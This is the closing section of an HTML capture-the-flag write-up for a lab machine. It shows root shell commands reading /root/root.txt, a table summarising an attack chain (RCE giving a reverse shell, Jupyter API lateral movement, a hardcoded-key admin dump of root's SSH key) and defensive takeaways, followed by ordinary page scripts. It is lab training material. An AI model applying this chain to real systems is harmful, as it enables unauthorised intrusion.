+<h3 id="root-flag">Root Flag</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">root@devhub:~# whoami
+root
+
+root@devhub:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@devhub:~# cat /root/root.txt
+f1e2d3c4b5a69788697081627384a5b6</code></pre>
+</div>
+
+<table>
+  <thead><tr><th>Flag</th><th>Location</th><th>Obtained Via</th></tr></thead>
+  <tbody>
+    <tr><td>user.txt</td><td>/home/analyst/user.txt</td><td>Jupyter API + Raw WebSocket (as analyst)</td></tr>
+    <tr><td>root.txt</td><td>/root/root.txt</td><td>SSH with dumped root private key</td></tr>
+  </tbody>
+</table>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="summary">Summary</h2>
+
+<h3 id="attack-chain">Attack Chain</h3>
+<table>
+  <thead><tr><th>Phase</th><th>Technique</th><th>Access Level</th><th>Key Finding</th></tr></thead>
+  <tbody>
+    <tr><td>1. Recon</td><td>Nmap + Service Analysis</td><td>None</td><td>MCPJam Inspector v1.4.2 on :6274</td></tr>
+    <tr><td>2. Initial Access</td><td>CVE-2026-23744 (RCE)</td><td>mcp-dev</td><td>Reverse shell via /api/mcp/connect</td></tr>
+    <tr><td>3. Lateral Movement</td><td>Jupyter REST API + Raw WebSocket</td><td>analyst</td><td>user.txt via code execution as analyst</td></tr>
+    <tr><td>4. Priv Esc</td><td>Internal API ops._admin_dump</td><td>root</td><td>Root SSH key via hardcoded API key</td></tr>
+  </tbody>
+</table>
+
+<h3 id="key-takeaways">Key Takeaways</h3>
+
+<ul>
+  <li><strong>No Port Forwarding Required.</strong> The entire attack was executed from the reverse shell itself, using <code>curl</code> for REST API calls and a custom Python WebSocket client for Jupyter kernel communication. This eliminates the need for Chisel, Ligolo, or SSH tunneling. It works in environments where the target has no internet access and is more stealthy since no additional binaries need to be uploaded.</li>
+  <li><strong>Raw WebSocket Implementation.</strong> When the <code>websocket-client</code> library is unavailable and cannot be installed (no internet), implementing a minimal WebSocket client using only the <code>socket</code> standard library is a viable alternative. The implementation covers the HTTP upgrade handshake, frame masking, and payload decoding in under 50 lines of Python.</li>
+  <li><strong>Hardcoded Credentials.</strong> The <code>server.py</code> internal API contained a hardcoded API key (<code>opsmcp_secret_key_4f5a6b7c8d9e0f1a</code>) that provided access to a dangerous admin dump function. Proper secrets management would have broken the privilege escalation path.</li>
+  <li><strong>Defense-in-Depth Failures.</strong> The machine suffered from multiple failures: unauthenticated RCE in MCPJam Inspector, Jupyter token exposed in process arguments, world-readable source code containing secrets, and an internal API with dangerous admin endpoints. Addressing any one of these would have broken the chain.</li>
+</ul>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  &copy; 2026 QA210 &mdash; CTF Writeups
+</footer>
+
+<script>
+function copyCode(btn) {
+  const pre = btn.closest('.code-block-wrapper').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function toggleMobileToc() {
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+function buildTOC() {
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const desktopUL = document.getElementById('tocDesktop');
+  const mobileUL = document.getElementById('tocMobile');
+  desktopUL.innerHTML = '';
+  mobileUL.innerHTML = '';
+  headings.forEach(h => {
+    if (!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
+    const li = document.createElement('li');
+    const a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    if (h.tagName === 'H3') a.classList.add('toc-h3');
+    li.appendChild(a);
+    desktopUL.appendChild(li);
+    mobileUL.appendChild(li.cloneNode(true));
+  });
+}
+buildTOC();
+const spyHeadings = document.querySelectorAll('.main-content h2, .main-content h3');
+const spyLinks = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+function updateSpy() {
+  let current = '';
+  spyHeadings.forEach(h => { if (h.getBoundingClientRect().top <= 80) current = h.id; });
+  spyLinks.forEach(a => { a.classList.toggle('active', a.getAttribute('href') === '#' + current); });
+}
+window.addEventListener('scroll', updateSpy, { passive: true });
+updateSpy();
+
+// Three.js Background — IcosahedronGeometry (network/hub theme for DevHub)
+(function() {
+  const canvas = document.getElementById('three-bg');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 100);
+  camera.position.z = 5;
+
+  const geo = new THREE.IcosahedronGeometry(2.5, 1);
+  const mat = new THREE.MeshBasicMaterial({ color: 0x3fb950, wireframe: true, transparent: true, opacity: 0.3 });
+  const mesh = new THREE.Mesh(geo, mat);
+  scene.add(mesh);
+
+  const pCount = 500;
+  const pGeo = new THREE.BufferGeometry();
+  const pPos = new Float32Array(pCount * 3);
+  const pVel = [];
+  for (let i = 0; i < pCount; i++) {
+    pPos[i*3]   = (Math.random() - 0.5) * 14;
+    pPos[i*3+1] = (Math.random() - 0.5) * 14;
+    pPos[i*3+2] = (Math.random() - 0.5) * 8;
+    pVel.push(Math.random() * 0.01 + 0.003);
+  }
+  pGeo.setAttribute('position', new THREE.BufferAttribute(pPos, 3));
+  const pMat = new THREE.PointsMaterial({ color: 0x58a6ff, size: 0.04, transparent: true, opacity: 0.6 });
+  const particles = new THREE.Points(pGeo, pMat);
+  scene.add(particles);
+
+  let mX = 0, mY = 0;
+  document.addEventListener('mousemove', e => {
+    mX = (e.clientX / window.innerWidth - 0.5) * 2;
+    mY = (e.clientY / window.innerHeight - 0.5) * 2;
+  });
+
+  function animate() {
+    requestAnimationFrame(animate);
+    mesh.rotation.x += 0.004;
+    mesh.rotation.y += 0.006;
+    const pos = particles.geometry.attributes.position.array;
+    for (let i = 0; i < pCount; i++) {
+      pos[i*3+1] -= pVel[i];
+      if (pos[i*3+1] < -7) { pos[i*3+1] = 7; pos[i*3] = (Math.random() - 0.5) * 14; }
+    }
+    particles.geometry.attributes.position.needsUpdate = true;
+    camera.rotation.y += (mX * 0.04 - camera.rotation.y) * 0.01;
+    camera.rotation.x += (mY * 0.04 - camera.rotation.x) * 0.01;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+</body>
+</html>
